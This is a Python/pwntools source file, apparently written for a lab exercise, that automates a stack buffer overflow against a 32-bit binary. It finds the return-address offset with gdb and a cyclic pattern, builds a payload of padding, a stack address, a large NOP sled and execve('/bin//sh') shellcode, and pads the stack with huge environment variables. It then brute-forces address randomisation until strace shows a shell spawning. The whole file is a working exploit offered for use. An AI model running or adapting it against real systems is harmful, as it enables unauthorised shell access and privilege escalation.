import subprocess
import struct
import os
import re
import sys
import select
import fcntl
import argparse
from pwn import *

log_file_path = 'strace.log'

env_vars = {
    "VAR1": "A" * 131000,
    "VAR2": "B" * 131000,
    "VAR3": "C" * 131000,
    "VAR4": "D" * 131000,
    "VAR5": "E" * 131000,
    "VAR6": "F" * 131000,
    "VAR7": "G" * 131000,
    "VAR8": "H" * 131000,
    "VAR9": "I" * 131000,
    "VAR10": "J" * 131000,
    "VAR11": "K" * 131000,
    "VAR12": "L" * 131000,
    "VAR13": "M" * 131000,
    "VAR14": "N" * 131000,
}

def check_target_bin(target):

    # if not os.path.isfile(f'/usr/local/bin/{target}'):
    #     raise argparse.ArgumentTypeError(f"Error: '{target}' does not exist.")
    # if not os.access(f'/mnt/binaries/{target}', os.X_OK):
    #     raise argparse.ArgumentTypeError(f"Error: '{target}' is not executable or permission is denied.")
    
    return target
    

def check_args():

    parser = argparse.ArgumentParser(
        description="a script that exploits a target binary and spawns a shell"
    )

    parser.add_argument(
        "target",
        type=check_target_bin,
        help="The target binary file to execute (must exist in /mnt/binaries and be executable)"
    )

    # parser.add_argument(
    #     "input_mode",
    #     type=int,
    #     choices=[0, 1],
    #     help="Input mode for the target: 0 for stdin (default), 1 for command-line input"
    # )
    args = parser.parse_args()


    return args


def cleanup(exit_code: int):

    os.remove("trash")
    os.remove("payload")
    os.remove("strace.log")
    sys.exit(exit_code)


def generate_test():
    return cyclic(10000)


def locate_ra(pattern, target):

    gdb_proc = subprocess.Popen(
        [f"gdb -q {target}"], 
        stdin=subprocess.PIPE, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        shell=True, 
        text=True
    )

    #send the pattern to the gdb target proc from both the arguments and stdin 
    #when I send commands from a script to gdb, 4 whitespaces (0x20202020) are added in the beginning of the buffer and it messes up the ra offset calculation!!!
    commands = f"""
    set disable-randomization off
    set pagination off
    r {pattern.decode('latin-1')}
    {pattern.decode('latin-1')}
    """

    gdb_proc.stdin.write(commands)
    gdb_proc.stdin.flush()

    while True:
        output = gdb_proc.stdout.readline()
        if "Program received signal SIGSEGV" in output:
            break

    gdb_proc.stdin.write("info registers\n")
    gdb_proc.stdin.flush()

    gdb_proc.stdin.write("info frame\n")
    gdb_proc.stdin.flush()

    gdb_proc.stdin.write("x/40x $esp-1100\n")
    gdb_proc.stdin.flush()

    gdb_proc.stdin.write("q\n")
    gdb_proc.stdin.write("y\n")
    gdb_proc.stdin.flush()

    output, _ = gdb_proc.communicate()

    # print(output)
    # print(pattern)
    
    eip_value = None
    for line in output.splitlines():
        if "eip" in line:  # Find the line with 'eip'
            eip_value = line.split()[1]  # Extract the hexadecimal value (second column)
            break

    # print(eip_value)

    offset = cyclic_find(int(eip_value, 16))
    # print(f"offset: {offset}")
    return offset

def locate_ra2(pattern, target):
        
    crash_proc = process(
        [target, 
        pattern.decode('latin-1')]
    )
        
    crash_proc.sendline(pattern.decode('latin-1'))      #sending the crash pattern via stdin for the binaries that consume input from standard input

    if crash_proc.poll(True) != 0:
        print(f"Process crashed with return code {crash_proc.poll(True)}")

    core = crash_proc.corefile          #problem with core files -> core dumps are piped in a program named apport that handles sensitive data ?? idek
    if core != None:
        print(f"eip val after crash: {core.eip}")
    else:
        print("No core file found")

        
def target_ra(target):

    #find in what adresses the stack fluctuates -> info proc mapping

    #first expand the stack filling it up with as many trash bytes as we can, will pass the trash file as command line argument
    trash = b'B'*131000
    trash_args = "`cat trash` " * 15    
    open("trash", "wb").write(trash)  

    gdb_process = subprocess.Popen(
        f"gdb {target}", 
        stdin=subprocess.PIPE, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        text=True, 
        shell=True
    )

    commands = f"""
    set disable-randomization off
    set breakpoint pending on
    b main
    r {trash_args}
    info proc mapping
    q
    y
    """

    gdb_process.stdin.write(commands)
    gdb_process.stdin.flush()
    output, _ = gdb_process.communicate()

    return output


def stack_middle_address(output):

    # Find the line containing the word "stack" and extract the address in the middle
    output_lines = output.split('\n')
    stack_line = next((line for line in output_lines if 'stack' in line), None)
    
    if stack_line is None:
        print("GDB failed to find the stack line.")
        cleanup(1)
    
    pattern = r'\b0x[0-9a-f]+\b'
    matches = re.findall(pattern, stack_line)
    
    start_address = int(matches[0], 16)
    end_address = int(matches[1], 16)
    
    middle = (start_address + end_address) // 2
    middle += 4  #all the addresses end in 00 and when this is concatenated in bytes in the payload, it starts with \x00 and terminates the payload. Adding 4 to avoid the \x00 sequence

    # print(f"stack middle target addr: {hex(middle)}")
    return middle


def construct_payload(offset, target):

    middle = stack_middle_address(target_ra(target))
    shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

    #!!! will change
    if target == 'vuln':
        offset += 4 
    #!!!

    payload = b'A' * offset
    payload += struct.pack("<I", middle)
    payload += b'\x90' * 129000
    payload += shellcode

    open("payload", "wb").write(payload)


def drain_fd(fd: int):
    try:
        while True:
            rlist, _, _ = select.select([fd], [], [], 0.2)
            if not rlist:
                break     #drained all trash content
            
            try:
                os.read(fd, 10000)
            except OSError:
                break
    except Exception as e:
        print(f"An error occurred while draining the buffer: {e}")
        cleanup()


def attach_strace():
    main_pid = os.getpid()
    strace_command = f"strace -f -e execve -p {str(main_pid)} -o strace.log"

    #all error logs to devnull to keep stdout clean
    with open(os.devnull, 'w') as devnull:
        subprocess.Popen(
            strace_command, 
            shell=True, 
            stderr=devnull
        )


    while not os.path.isfile('strace.log'):
        time.sleep(0.1)


def detect_crash(pid: int):
    pid_str = str(pid)

    # pattern to detect the SIGCHLD signal with a SIGSEGV e.g. SIGCHLD {si_signo=SIGCHLD, si_code=CLD_DUMPED, si_pid=15595, si_uid=0, si_status=SIGSEGV, si_utime=0, si_stime=3}
    pattern = re.compile(
        rf"{pid_str}.*SIGCHLD.*si_status=SIGSEGV"
        # rf"{ppid_str}.*SIGCHLD.*si_pid={pid_str}.*si_status=(139|[^,]*SIGSEGV)" => THis line occurs after the exploit process terminates, right now the exploit proc is still running
    )

    try:
        with open(log_file_path, 'r') as log_file:
            lines = log_file.readlines()

            for line in lines:

                if pattern.search(line):
                    return True

    except FileNotFoundError:
        print(f"Log file '{log_file_path}' not found.")
        cleanup()
    except Exception as e:
        print(f"An error occurred while reading the log file: {e}")
        cleanup()

    return False


def detect_execve():
    pattern = re.compile(
        r"\d+\s+execve\(\"/bin//sh\", NULL, NULL\)\s+=\s+0"
    )

    try:
        with open(log_file_path, 'r') as log_file:
            lines = log_file.readlines()
            for line in lines:
                if pattern.search(line):
                    return True

    except FileNotFoundError:
        print(f"Log file '{log_file_path}' not found.")
        cleanup(1)
    except Exception as e:
        print(f"An error occurred while reading the log file: {e}")
        cleanup(1)

    return False


def main():
        
    if len(sys.argv) != 2:
        sys.exit(1)

    args = check_args()

    # Extract arguments
    target = args.target

    context.log_level='warn'
    # context.log_level = 'debug'

    #this program has PIE enabled -> compilation option that changes the location of the executable in every run

    ra_offset = locate_ra(generate_test(), target)
    construct_payload(ra_offset, target)
    attach_strace()

    #performing brute force attack
    # exploit_command = f"cat payload - | {target} " + " ".join(["`cat trash`"] * 15)
    exploit_command = f"cat payload - | {target} -c `cat payload`"

    i = 0
    while True:
        print(f"Attempt: {i}")
        i += 1
        
        #passing on 2MB of env vars to fill up the stack
        exploit_proc = process(exploit_command, shell=True, stdin=PTY, stdout=PTY, stderr=PTY, raw=False, env=env_vars)
        exploit_proc.sendline()
        
        try:
            while True:

                if detect_execve():
                    log.success("Exploit successful, shell spawned!")
                    drain_fd(exploit_proc.proc.stdout.fileno())
                    exploit_proc.interactive()
                    exploit_proc.close()
                    cleanup(0)


                output = exploit_proc.recv(timeout=0.2)   # timeout -> give enough time for target bin to read the payload and for recv to consume the content of the pty output buffer: 0.1 was not enough apparently
                
                if output:
                    if detect_crash(exploit_proc.pid) or i == 1:
                        with open(log_file_path, 'a+') as log_file:
                            fcntl.flock(log_file, fcntl.LOCK_EX)
                            try:
                                log_file.truncate(0)  #empty log file to reduce load during searches
                                log_file.seek(0)
                            finally:
                                fcntl.flock(log_file, fcntl.LOCK_UN)
                        break
                else:
                    break

        except EOFError:
            log.warning("No output received, breaking out of loop.")

        exploit_proc.close()


if __name__ == "__main__":
    main()